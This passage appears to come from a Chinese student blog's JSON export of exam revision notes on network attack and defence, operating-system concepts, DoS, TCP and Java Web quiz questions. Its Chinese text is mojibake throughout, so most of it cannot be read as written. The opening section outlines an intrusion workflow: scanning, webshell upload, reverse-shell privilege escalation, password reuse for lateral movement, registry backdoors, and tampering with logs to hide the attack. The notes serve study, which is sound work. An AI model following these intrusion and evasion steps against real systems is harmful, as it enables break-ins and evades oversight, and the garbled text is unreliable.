æ¼æ´åˆ©ç”¨ã€è·å¾—webshell+ææƒã€‘â†’å†…ç½‘è½¬å‘â†’å†…ç½‘æ¨ªå‘æ¸—é€â†’æƒé™ç»´æŒã€åˆ›å»ºå¹¶éšè—åé—¨ï¼Œè¿›è¡Œé•¿æœŸçš„ä¿¡æ¯æ”¶é›†ã€‘â†’æ¸…ç†ç—•è¿¹ ä¿¡æ¯æ”¶é›†ï¼šæ¯”å¦‚ï¼šæœåŠ¡å™¨çš„ç±»å‹ä¸ç‰ˆæœ¬ã€windwosè¿˜æ˜¯linuxã€‘ã€æ–¹æ³•ï¼šnmap -O ip è¿›è¡Œæ‰«æã€‘ã€è„šæœ¬ç±»å‹ã€Phpã€jspè¿˜æ˜¯aspç­‰ã€‘ã€Firefoxçš„æ’ä»¶wappalyzeræŸ¥çœ‹ã€‘ã€ç½‘ç«™å®¹å™¨ã€tomcatã€apacheã€iisç­‰ã€‘ã€æ•°æ®åº“ç±»å‹ä¸ç‰ˆæœ¬ã€mysqlã€orcaleç­‰ã€‘ã€ç›®æ ‡å¼€æ”¾çš„ç«¯å£ã€nmapç«¯å£æ‰«æã€‘ï¼ŒæŒ‡å®šç«¯å£è¿è¡Œçš„æœåŠ¡ã€Nessusä¸»æœºæ‰«æã€‘ã€ç›®æ ‡ä¸»æœºä¸Šæœ‰å“ªäº›æ¼æ´ã€Nessusæ¼æ´æ‰«æã€‘ã€ç›®å½•æ•æ„Ÿç›®å½•å’Œæ–‡ä»¶ã€å¾¡å‰‘ã€‘ã€æ—ç«™å’ŒCæ®µæ‰«æã€è¿˜å¯ä»¥é€šè¿‡è°·æ­Œé»‘å®¢è¯­æ³•è¿›è¡Œç½‘ç«™äººå‘˜çš„ä¿¡æ¯æœé›†ã€‚ æ¼æ´æ¢æµ‹ï¼šæ¢æµ‹ç½‘ç«™æ˜¯å¦å­˜åœ¨ä¸€äº›å¸¸è§çš„Webæ¼æ´ï¼Œæ¯”å¦‚sqlæ³¨å…¥ã€xssã€ssrfã€æ–‡ä»¶ä¸Šä¼ ç­‰ã€‚ã€é€šè¿‡ç½‘ç«™æ¼æ´æ‰«æå·¥å…·+æ‰‹å·¥æµ‹è¯•ï¼šåŠè‡ªåŠ¨åŒ–ï¼Œå·¥å…·æ¯”å¦‚ï¼šNessusã€AWVSã€‘ æ¼æ´åˆ©ç”¨ï¼š å½“æˆ‘ä»¬æ¢æµ‹åˆ°äº†è¯¥ç½‘ç«™å­˜åœ¨æ¼æ´ä¹‹åï¼Œæˆ‘ä»¬å°±è¦å¯¹è¯¥æ¼æ´è¿›è¡Œåˆ©ç”¨äº†ã€‚ä¸åŒçš„æ¼æ´æœ‰ä¸åŒçš„åˆ©ç”¨å·¥å…·ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œé€šè¿‡ä¸€ä¸ªæ¼æ´æˆ‘ä»¬å¾ˆéš¾æ‹¿åˆ°ç½‘ç«™çš„webshellï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ç»“åˆå‡ ä¸ªæ¼æ´æ¥æ‹¿webshellã€‚å¸¸ç”¨çš„æ¼æ´åˆ©ç”¨å·¥å…·å¦‚ä¸‹ï¼šSQLæ³¨å…¥ â€”&gt; Sqlmapçš„ä½¿ç”¨ XSSâ€”&gt; Beef-XSSçš„ä½¿ç”¨ Burpsuiteè¿›è¡ŒæŠ“åŒ…æ”¹åŒ… ä¸Šä¼ æ¼æ´çš„è¯â†’ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ä¸Šå»ï¼Œè¿›è€Œå†è·å¾—webshellã€‚ è·å¾—äº†webshellåï¼Œä¸€èˆ¬æƒé™å¾ˆä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ææƒï¼Œå¯ä»¥é€‰æ‹©åå¼¹ä¸€ä¸ªMSFç±»å‹çš„shellææƒï¼Œä¹Ÿå¯ä»¥MSFå’ŒCobaltStrikeè”åŠ¨ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ææƒï¼šWindowsææƒ ã€ Linuxææƒ å†…ç½‘è½¬å‘ï¼šè¿›ä¸€æ­¥çš„æ¢æµ‹å†…ç½‘ä¸»æœºçš„ä¿¡æ¯çš„è¯ï¼Œæˆ‘ä»¬å°±éœ€è¦è¿›è¡Œå†…ç½‘è½¬å‘äº†ã€‚é€šè¿‡å„ç§ç±»å‹çš„ä»£ç†ï¼Œæ¯”å¦‚EWæ­£å‘ä»£ç†ã€EWåå‘ä»£ç†ç­‰ å†…ç½‘æ¨ªå‘æ¸—é€ï¼š windowsä¸»æœºï¼šå»ç¿»ç›®å½•æˆ–è€…æ¡Œé¢ä¸Šçš„å¤‡å¿˜å½•ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€äº›éšç§ä¿¡æ¯ã€‚æˆ‘ä»¬è¿˜å¯ä»¥æŸ¥æ‰¾æ•°æ®åº“çš„è¿æ¥æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ•°æ®åº“çš„è¿æ¥è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚æˆ‘ä»¬å°½é‡ä¸è¦ä½¿ç”¨è¿œç¨‹æ¡Œé¢ã€‚ä»è¯¥ä¸»æœºä¸Šæ‰¾åˆ°çš„è´¦å·å¯†ç ï¼Œå¯ä»¥åšä¸€ä¸ªå­—å…¸ï¼Œåœ¨å¯¹å†…ç½‘å…¶ä»–æœºå™¨è¿›è¡Œçˆ†ç ´çš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯åŒå¯†ç ã€‚ åˆ›å»ºåé—¨ï¼šå…¥ä¾µç³»ç»Ÿåï¼Œå¯¹è‡ªå·±é¢˜ææƒï¼Œæ‹¥æœ‰ä¿®æ”¹æ³¨å†Œè¡¨çš„æƒé™ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨å®ç°å¯¹ç³»ç»Ÿçš„æ”»å‡»æˆ–ä¸ºä¸‹ä¸€æ¬¡æ”»å‡»åšå¥½å‡†å¤‡ã€‚ æ¸…ç†ç—•è¿¹ï¼šåœ¨æ¸—é€å‰æŒ‚ä¸Šä»£ç†ï¼Œç„¶ååœ¨æ¸—é€åç—•è¿¹æ¸…ç†ï¼šåˆ é™¤å¹¶ç¯¡æ”¹ç³»ç»Ÿæ—¥å¿—ï¼Œé¿å…è¢«åˆ«äººå‘ç°æˆ‘ä»¬çš„æ”»å‡»è¡Œä¸ºã€‚ è¿›ç¨‹ã€çº¿ç¨‹ã€ç¨‹åºã€æœåŠ¡ï¼Œä»¥åŠå®ƒä»¬ä¹‹é—´çš„å…³ç³»ï¼Ÿ è¯¦æƒ… ã€PPT-Chap2:é¡µ52-é¡µ53ã€‘ è¿›ç¨‹ï¼š è¿›ç¨‹æ˜¯æ­£åœ¨è¿›è¡Œçš„ç¨‹åºçš„å®ä¾‹ï¼Œæ˜¯è®¡ç®—æœºä¸­çš„ç¨‹åºå…³äºæŸæ•°æ®é›†åˆä¸Šçš„ä¸€æ¬¡è¿è¡Œæ´»åŠ¨ï¼Œæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚ ä¾‹ï¼šåœ¨è®¡ç®—æœºä¸Šæ‰“å¼€äº†QQå°±æ‰“å¼€äº†ä¸€ä¸ªè¿›ç¨‹ã€‚ çº¿ç¨‹ï¼š çº¿ç¨‹æ˜¯è¿›ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œæœ‰æ—¶ä¹Ÿç§°ä¸ºè½»é‡çº§è¿›ç¨‹ï¼ˆLight Weight Processï¼ŒLWPï¼‰ï¼Œæ˜¯ç¨‹åºæ‰§è¡Œæµçš„æœ€å°å•å…ƒã€‚ ä¾‹ï¼šåœ¨QQè¿™ä¸ªè¿›ç¨‹é‡Œï¼Œä¼ è¾“æ–‡å­—å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œä¼ è¾“è¯­éŸ³å¼€äº†ä¸€ä¸ªçº¿ç¨‹ï¼Œå¼¹å‡ºå¯¹è¯æ¡†åˆå¼€äº†ä¸€ä¸ªçº¿ç¨‹ã€‚ ç¨‹åºï¼š ç¨‹åºæ˜¯ä¸€ç»„å¯æ‰§è¡ŒæŒ‡ä»¤çš„é›†åˆï¼Œæ˜¯æŒ‡ä¸ºäº†å¾—åˆ°æŸç§ç»“æœè€Œå¯ä»¥ç”±è®¡ç®—æœºç­‰å…·æœ‰ä¿¡æ¯å¤„ç†èƒ½åŠ›çš„è£…ç½®æ‰§è¡Œçš„ä»£ç åŒ–æŒ‡ä»¤åºåˆ— æœåŠ¡ï¼š æœåŠ¡æ˜¯æ‰§è¡ŒæŒ‡å®šç³»ç»ŸåŠŸèƒ½çš„ç¨‹åºã€ä¾‹ç¨‹ï¼ˆä¾‹ç¨‹æ˜¯æŸä¸ªç³»ç»Ÿå¯¹å¤–æä¾›çš„åŠŸèƒ½æ¥å£æˆ–æœåŠ¡çš„é›†åˆï¼Œå¦‚æ“ä½œç³»ç»Ÿçš„APIï¼Œä¾‹ç¨‹çš„ä½œç”¨ç±»ä¼¼äºå‡½æ•°ï¼‰æˆ–è¿›ç¨‹ ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 6.png) è¿›ç¨‹ è¿›ç¨‹æ˜¯æ­£åœ¨è¿›è¡Œçš„ç¨‹åºçš„å®ä¾‹ è¿›ç¨‹æ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ è¿›ç¨‹æ˜¯ä¸€ä¸ªåŠ¨æ€çš„å®ä½“ï¼Œæœ‰è‡ªå·±çš„ç”Ÿå‘½å‘¨æœŸ ä¾‹å¦‚ï¼šåœ¨è®¡ç®—æœºä¸Šæ‰“å¼€äº†QQå°±æ‰“å¼€äº†ä¸€ä¸ªè¿›ç¨‹ çº¿ç¨‹ çº¿ç¨‹æ˜¯è¿›ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ç¨‹åºæ‰§è¡Œæµçš„æœ€å°å•å…ƒã€‚ ä¾‹å¦‚QQè¿™ä¸ªè¿›ç¨‹é‡Œï¼Œä¼ è¾“æ–‡å­—å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œä¼ è¾“è¯­éŸ³å¼€ä¸€ä¸ªçº¿ç¨‹ ç¨‹åº ç¨‹åºæ˜¯ä¸€ç»„å¯æ‰§è¡ŒæŒ‡ä»¤çš„é›†åˆï¼Œé™æ€å®ä½“ æœåŠ¡ æœåŠ¡æ˜¯æ‰§è¡Œç‰¹å®šç³»ç»ŸåŠŸèƒ½çš„ç¨‹åºã€ä¾‹ç¨‹æˆ–è¿›ç¨‹ è¿›ç¨‹ã€çº¿ç¨‹ä¹‹é—´çš„è”ç³» è¿›ç¨‹å’Œçº¿ç¨‹éƒ½æ˜¯ç”±æ“ä½œç³»ç»Ÿæ‰€åŒ…å«çš„ç¨‹åºè¿è¡Œçš„åŸºæœ¬å•å…ƒï¼Œç³»ç»Ÿåˆ©ç”¨è¯¥åŸºæœ¬å•å…ƒå®ç°åº”ç”¨çš„å¹¶å‘æ€§ã€‚ ç³»ç»Ÿåœ¨è¿è¡Œæ—¶ä¼šä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹åˆ†é…ä¸åŒçš„å†…å­˜åŒºåŸŸï¼Œä½†ä¸ä¼šä¸ºçº¿ç¨‹åˆ†é…ï¼Œçº¿ç¨‹åªèƒ½å…±äº«èµ„æºã€‚ è¿›ç¨‹æ˜¯ç³»ç»Ÿèµ„æºåˆ†é…æ—¶çš„ä¸€ä¸ªåŸºæœ¬å•ä½ï¼Œæ‹¥æœ‰ä¸€ä¸ªå®Œæ•´çš„è™šæ‹Ÿç©ºé—´ï¼Œä¸ä¾èµ–çº¿ç¨‹ç‹¬ç«‹å­˜åœ¨ è¿›ç¨‹ã€çº¿ç¨‹ã€ç¨‹åºä¹‹é—´çš„è”ç³» ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ è¿›ç¨‹æ˜¯åŠ¨æ€å®ä½“ã€æ˜¯ç¨‹åºçš„è¿è¡Œå®ä½“ï¼Œæœ‰è‡ªå·±çš„ç”Ÿå‘½å‘¨æœŸã€‘ï¼Œç¨‹åºæ˜¯é™æ€å®ä½“ï¼Œåªæœ‰ç¨‹åºåœ¨è¿è¡Œæ—¶æ‰ä¼šäº§ç”Ÿè¿›ç¨‹ã€‚ æœåŠ¡ä¸è¿›ç¨‹ä¹‹é—´çš„è”ç³» ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„ è¿›ç¨‹æ˜¯å½“å‰ç³»ç»Ÿä½¿ç”¨ä¸­è°ƒç”¨ç¨‹åºçš„å®ä½“ æœåŠ¡æ˜¯å½“å‰ä½¿ç”¨çš„ä¸€äº›è§„åˆ™ï¼ŒæœåŠ¡çš„æ‰“å¼€ä¸å¦å…³ç³»åˆ°ç³»ç»Ÿèƒ½å¦æ‰§è¡ŒæŸäº›ç‰¹å®šçš„åŠŸèƒ½ ä»€ä¹ˆæ˜¯å…¥ä¾µæ£€æµ‹ï¼ŸåŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ å…¥ä¾µæ£€æµ‹ï¼šâ€œä¸»åŠ¨é˜²å¾¡â€çš„æ£€æµ‹æŠ€æœ¯ åŠŸèƒ½ï¼šå…·æœ‰è¾ƒå¼ºçš„å®æ—¶é˜²æŠ¤åŠŸèƒ½ï¼Œå¯ä»¥è¿…é€Ÿæä¾›å¯¹ç³»ç»Ÿã€ç½‘ç»œçš„æ”»å‡»å’Œç”¨æˆ·è¯¯æ“ä½œçš„å®æ—¶é˜²æŠ¤ ä½œç”¨ï¼šåœ¨æ£€æµ‹åˆ°å…¥ä¾µä¼å›¾æ—¶ï¼Œè¿›è¡Œæ‹¦æˆªæˆ–é¢˜å‹ç®¡ç†å‘˜åšå¥½é˜²æŠ¤ ä»€ä¹ˆæ˜¯æ‹’ç»æœåŠ¡ï¼Ÿåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ï¼Ÿ æ‹’ç»æœåŠ¡ï¼ˆDeny of Serviceï¼ŒDoSï¼‰ ï¼š â€é€šè¿‡è¿ç»­å‘æ”»å‡»ç›®æ ‡å‘é€è¶…å‡ºå…¶å¤„ç†èƒ½åŠ›çš„è¿‡é‡æ•°æ®ï¼Œæ¶ˆè€—å…¶æœ‰é™çš„ç½‘ç»œé“¾è·¯æˆ–æ“ä½œç³»ç»Ÿèµ„æºï¼Œä½¿ä¹‹æ— æ³•ä¸ºåˆæ³•ç”¨æˆ·æä¾›æœ‰æ•ˆæœåŠ¡ åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡(Distributed DoSï¼ŒDDoSï¼‰ åˆ©ç”¨ç½‘ç»œä¸­ä¸åŒçš„ä¸»æœºåŒæ—¶å‘èµ·DoS æ”»å‡»ï¼Œä½¿å¾—è¢«æ”»å‡»å¯¹è±¡ä¸èƒ½æœåŠ¡äºæ­£å¸¸ç”¨æˆ· DoSä¸DDoSå·®å¼‚ DoSæ”»å‡»ä¸­çš„æ•°æ®åŒ…æ¥è‡ªä¸€ä¸ªå›ºå®šçš„æ”»å‡»æº DDoSæ”»å‡»ä¸­çš„æ•°æ®åŒ…æ¥è‡ªä¸åŒæ”»å‡»æº ç½‘è·¯æ•°æ®åˆ†æå­¦ä¼šçœ‹å‘½ä»¤ã€‚æ”»å‡»æºipåœ°å€ï¼Œç›®æ ‡åœ°å€ipï¼Œæ”»å‡»è¯­è¨€ã€ç›®æ ‡åœ°å€ã€IPåœ°å€ã€æ€ä¹ˆè¿›è¡Œäº¤äº’çš„ï¼Ÿ TCPä¸‰æ¬¡æ¡æ‰‹çš„å«ä¹‰ï¼Ÿï¼ˆå»ºç«‹ã€ç¡®è®¤ã€è¯·æ±‚ã€è¿”å›ã€å»ºç«‹ã€ä¼ è¾“æ•°æ®ã€é‡Šæ”¾ã€ç¡®è®¤ï¼‰ ç­”æ¡ˆåœ¨ä¸€å¹…å›¾é‡Œ ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 7.png) TCPè¿æ¥æ‰«æï¼ˆTCP connect Scanï¼‰ä¹Ÿç§°ä¸ºâ€œTCPå…¨è¿æ¥æ‰«æâ€ï¼Œå®ƒåˆ©ç”¨TCPåè®®çš„3æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œç›´æ¥è¿åˆ°ç›®æ ‡ç«¯å£å¹¶å®Œæˆä¸€ä¸ªå®Œæ•´çš„3æ¬¡æ¡æ‰‹è¿‡ç¨‹ ç›®æ ‡ä¸»æœºçŠ¶æ€åŠåº”ç­”æ•°æ®åŒ… CloseçŠ¶æ€ è¡¨ç¤ºç›®æ ‡ä¸»æœºçš„ç«¯å£å¤„äºå…³é—­çŠ¶æ€ RSTæ•°æ®åŒ… â†’ ä¸¢å¼ƒ å…¶å®ƒæ•°æ®åŒ… â†’ è¿”å›RSTæ•°æ®åŒ… LISTENçŠ¶æ€ è¡¨ç¤ºç›®æ ‡ä¸»æœºçš„ç«¯å£å¤„äºç›‘å¬çŠ¶æ€ SYNæ•°æ®åŒ…â†’ è¿”å›SYNæˆ–ACKæ•°æ®åŒ…â†’ SYN-RCVDçŠ¶æ€ ACKæ•°æ®åŒ…â†’ è¿”å›RSTæ•°æ®åŒ… å…¶å®ƒæ•°æ®åŒ…â†’ ä¸¢å¼ƒ SYN-RCVDçŠ¶æ€ è¡¨ç¤ºç›®æ ‡ä¸»æœºçš„ç«¯å£å¤„äºåŒæ­¥æ”¶åˆ°çŠ¶æ€ RSTæ•°æ®åŒ…â†’ è¿”å›LISTENçŠ¶æ€ ACKæ•°æ®åŒ… â†’ è¿›å…¥ESTABLISHEDï¼ˆè¿æ¥å»ºç«‹ï¼‰çŠ¶æ€ï¼Œå¹¶å»ºç«‹TCPè¿æ¥ å…¶å®ƒæ•°æ®åŒ…â†’ ä¸¢å¼ƒ","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ç½‘ç»œæ”»é˜²","slug":"æœŸæœ«è€ƒè¯•/ç½‘ç»œæ”»é˜²","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"WEB æœŸæœ«çŸ¥è¯†ç‚¹","slug":"WEB-æœŸæœ«çŸ¥è¯†ç‚¹","date":"2021-06-22T11:37:11.000Z","updated":"2024-11-12T06:59:06.000Z","comments":true,"path":"2021/06/22/WEB-æœŸæœ«çŸ¥è¯†ç‚¹/","permalink":"https://gryffinbit.top/2021/06/22/WEB-%E6%9C%9F%E6%9C%AB%E7%9F%A5%E8%AF%86%E7%82%B9/","excerpt":"","text":"é¢˜å‹é€‰æ‹©é¢˜å¹³å‡æ¯ç« 3é“é¢˜ åˆ¤æ–­é¢˜å¹³å‡æ¯ç« 1é“é¢˜ ç¼–ç¨‹é¢˜é‡ç‚¹9ã€10ç«  ç¬¬ä¸€ç«  Java Webå¼€å‘ç¯å¢ƒé…ç½® åœ¨Webç¨‹åºç»“æ„ä¸­ï¼Œæµè§ˆå™¨ç«¯ä¸åº”ç”¨æœåŠ¡å™¨ç«¯é‡‡ç”¨è¯·æ±‚&#x2F;å“åº”æ¨¡å¼è¿›è¡Œäº¤äº’çš„è¿‡ç¨‹ä¸ºï¼ˆï¼‰ ç”¨æˆ·è¾“å…¥ã€å‘é€è¯·æ±‚ã€è®¿é—®æ•°æ®åº“ã€è¿”å›ç»“æœã€å‘é€å“åº”ã€æ˜¾ç¤º ä¸‹åˆ—è¯´æ³•æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ B&#x2F;Sç»“æ„ç›¸è¾ƒäºC&#x2F;Sç»“æ„æœåŠ¡å™¨è´Ÿæ‹…æ¯”è¾ƒé‡ï¼Œå¿«é€Ÿå“åº”ä¸å¦‚C&#x2F;Sç»“æ„ã€‚ Tomcatå®‰è£…ç›®å½•ä¸­binæ–‡ä»¶å¤¹ä¸‹å­˜æ”¾çš„æ–‡ä»¶ä¸ºï¼ˆï¼‰ã€‚ æ”¯æŒTomcatè¿è¡Œçš„å¸¸è§.exeæ–‡ä»¶ JSPçš„å…¨ç§°ä¸ºï¼ˆï¼‰ã€‚ Java Server Pages ä¸‹é¢å…³äºJSPçš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. åˆ©ç”¨JSPå¯ä»¥å¾ˆæ–¹ä¾¿åœ°åœ¨é¡µé¢ä¸­ç”ŸæˆåŠ¨æ€çš„å†…å®¹ã€‚ B. JSPæ˜¯ç”±Sunå…¬å¸æå‡ºçš„ã€å…¶ä»–è®¸å¤šå…¬å¸ä¸€èµ·å‚ä¸å»ºç«‹çš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯æ ‡å‡†ã€‚ C. JSPå¼€å‘çš„Webåº”ç”¨ä¸èƒ½è·¨å¹³å°ã€‚ âŒ D. JSPå…·å¤‡äº†JavaæŠ€æœ¯é¢å‘å¯¹è±¡ã€ä¸å¹³å°æ— å…³æ€§ä¸”å®‰å…¨å¯é çš„ä¼˜ç‚¹ åœ¨ä¸‹åˆ—é€‰é¡¹ä¸­ï¼Œæ­£ç¡®çš„URLæ˜¯ï¼ˆï¼‰ã€‚ https://localhost:8080/Prj01/index.jsp ä¸‹é¢å…³äºURLçš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. URLçš„ç¬¬äºŒéƒ¨åˆ†æ˜¯åè®®ã€‚ âŒ B. URLçš„ç¬¬äºŒéƒ¨åˆ†æ˜¯ä¸»æœºçš„IPåœ°å€ã€‚ C. URLçš„å¤§å°å†™æ˜¯æ•æ„Ÿçš„ã€‚ D. URLçš„å…¨ç§°ä¸ºâ€œç»Ÿä¸€èµ„æºå®šä½ç¬¦â€ã€‚ å…³äºWebé¡¹ç›®çš„ç›®å½•ç»“æ„ï¼Œä¸‹é¢è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. WebRootç›®å½•æ˜¯Webåº”ç”¨çš„é¡¶å±‚ç›®å½•ï¼Œä¹Ÿç§°ä¸ºæ–‡æ¡£çš„æ ¹ç›®å½•ã€‚ B. web.xmlæ˜¯Webåº”ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥éšæ„ä¿®æ”¹ã€‚ âŒ C. libæ–‡ä»¶å¤¹é‡ŒåŒ…å«äº†Webåº”ç”¨æ‰€éœ€çš„.jarå’Œ.zipæ–‡ä»¶ã€‚ D. META-INFæ˜¯ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆã€ç”¨äºå­˜æ”¾ç³»ç»Ÿæè¿°ä¿¡æ¯çš„æ–‡ä»¶å¤¹ã€‚ WebRootç›®å½•æ˜¯Webåº”ç”¨çš„é¡¶å±‚ç›®å½•ï¼Œä¹Ÿç§°ä¸ºæ–‡æ¡£çš„æ ¹ç›®å½•ã€‚å­˜æ”¾é…ç½®æ–‡ä»¶WebAppsæ–‡ä»¶å¤¹é‡Œçš„å†…å®¹æ˜¯ç½‘ç«™èµ„æºæ–‡ä»¶ã€‚META-INFå­˜æ”¾ç³»ç»Ÿæè¿°ä¿¡æ¯çš„æ–‡ä»¶å¤¹WEB-INF å­˜æ”¾éƒ¨ç½²æè¿°æ–‡ä»¶ åœ¨ç½‘ç»œåº”ç”¨ç¨‹åºä¸­æœ‰ä¸¤ç§åŸºæœ¬çš„ç»“æ„ï¼Œå³å®¢æˆ·æœº&#x2F;æœåŠ¡å™¨å’Œæµè§ˆå™¨&#x2F;æœåŠ¡å™¨ã€‚ Webé¡¹ç›®å±äºB&#x2F;Sç»“æ„ åœ¨Webç¨‹åºç»“æ„ä¸­ï¼Œæµè§ˆå™¨ç«¯ä¸åº”ç”¨æœåŠ¡å™¨ç«¯è¯·æ±‚æ¨¡å¼&#x2F;é‡‡ç”¨å“åº”è¿›è¡Œäº¤äº’ åœ¨åº”ç”¨ç¨‹åºé¢†åŸŸï¼ŒWebæ˜¯World Wide Webçš„ç®€ç§°ã€‚ TomcatæœåŠ¡å™¨è¿è¡Œçš„ç«¯å£å·é»˜è®¤ä¸º8080 Tomcatå®‰è£…ç›®å½•ä¸­webappsæ–‡ä»¶å¤¹é‡Œçš„å†…å®¹æ˜¯ç½‘ç«™èµ„æºæ–‡ä»¶ã€‚ IDEæ˜¯å¸®åŠ©ç”¨æˆ·è¿›è¡Œå¿«é€Ÿå¼€å‘çš„è½¯ä»¶ï¼Œå®ƒçš„ä¸­æ–‡å…¨ç§°é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIntegrated Development Environment åœ¨Webé¡¹ç›®çš„ç›®å½•ç»“æ„ä¸­ï¼ŒWebRootç›®å½•ç”¨æ¥å­˜æ”¾é…ç½®æ–‡ä»¶ ä¸€å°TomcatæœåŠ¡å™¨çš„IPåœ°å€ä¸º110.74.22.15ç½‘ç«™ç«¯å£å·ä¸º8080ï¼Œåˆ™è®¿é—®Webé¡¹ç›®Demoä¸­çš„test.jspçš„URLä¸ºhttps://110.74.22.15:8080/Demo/test.jsp JSPè§„èŒƒå”¯ä¸€æ”¯æŒçš„è¯­è¨€æ˜¯ Java å¯ä»¥é€šè¿‡ä¿®æ”¹Tomcatçš„é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹å‚æ•°ï¼Œä¸‹é¢çš„server.xmlæ–‡ä»¶éƒ¨åˆ†ä»£ç ä¸­ï¼Œç«¯å£å·æ˜¯å¤šå°‘ï¼ˆï¼‰ 12345&lt;Connector port=â€8443â€ protocol=â€HTTP/1.1â€connectionTimeout=â€8080â€redirectPort=â€8888â€/&gt; A. 8443 âœ… B. 8888 C. 8080 D. 1.1 åœ¨Eclipseä¸­ï¼Œä¸€ä¸ªWebåº”ç”¨ç¨‹åºçš„éƒ¨ç½²æè¿°æ–‡ä»¶ä½äºï¼ˆ ï¼‰ç›®å½•ã€‚ A. WebRoot B. META-INF C. src D. WEB-INF âœ… web.xml æ˜¯webåº”ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œä¸èƒ½åˆ é™¤æˆ–éšæ„ä¿®æ”¹ï¼Œä½äºWEB-INFç›®å½•æ ¹ç›®å½•ä¸‹ å…³äºä¸‹é¢è¿™ä¸ªURLè¯´æ³•æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ http://localhost:8080/Prj01/index.jsp A. httpæ˜¯ä¸»æœºåœ°å€ B. localhostæ˜¯åè®® C. 8080æ˜¯ä¸»æœºIPåœ°å€ D. prj01æ˜¯ä¸»æœºèµ„æºç›®å½• âœ… httpæ˜¯åè®® localhostæ˜¯ä¸»æœºIPåœ°å€æˆ–åŸŸå 8080æ˜¯ç«¯å£å· prj01&#x2F;index.jspæ˜¯ä¸»æœºèµ„æºå…·ä½“åœ°å€ï¼Œå¦‚ç›®å½•å’Œæ–‡ä»¶åç­‰ å½“ç”¨æˆ·è¯·æ±‚JSPé¡µé¢æ—¶ï¼ŒJSPå¼•æ“ä¼šæ‰§è¡Œè¯¥é¡µé¢çš„å­—èŠ‚ç æ–‡ä»¶å“åº”å®¢æˆ·çš„è¯·æ±‚ï¼Œæ‰§è¡Œå­—èŠ‚ç æ–‡ä»¶çš„ç»“æœæ˜¯ï¼ˆï¼‰ A. å‘é€ä¸€ä¸ªHTMLé¡µé¢åˆ°å®¢æˆ·ç«¯é¢ âœ… B. ä»€ä¹ˆéƒ½ä¸åš C. å‘é€ä¸€ä¸ªJavaæ–‡ä»¶åˆ°å®¢æˆ·ç«¯ D. å‘é€ä¸€ä¸ªJSPæºæ–‡ä»¶åˆ°å®¢æˆ·ç«¯ ç¬¬äºŒç«  HTMLåŸºç¡€ HTMLè¯­è¨€æ³¨é‡Šçš„æ ¼å¼ä¸ºï¼ˆï¼‰ã€‚ **** ä¸‹åˆ—å…³äºHTMLçš„è¯´æ³•ä¸æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ A. ä¹‹é—´çš„å†…å®¹ä¸ºæµè§ˆå™¨ä¸­ç½‘é¡µä¸Šæ˜¾ç¤ºçš„å†…å®¹ã€‚ B. HTMLè¯­è¨€å¤§å°å†™ä¸æ•æ„Ÿã€‚ C. HTMLæ–‡ä»¶å¿…é¡»ç”±å¼€å¤´ã€ç»“å°¾ã€‚ D. ä¹‹é—´çš„å†…å®¹æ˜¯ç”¨æ¥è®¾ç½®ä¸€äº›ç½‘é¡µç›¸å…³å±æ€§å’Œä¿¡æ¯çš„ï¼Œä¸å¯ä»¥çœç•¥ã€‚ âŒ &lt;head&gt;&lt;/head&gt; å¯ä»¥çœç•¥ ä¸‹é¢ï¼ˆï¼‰ä¸æ˜¯alignå±æ€§çš„å€¼ã€‚ A. top âŒ B. center C. right D. left åœ¨ä¸‹åˆ—æ ‡ç­¾ä¸­ï¼Œ&lt;i&gt;å†…å®¹&lt;/i&gt; 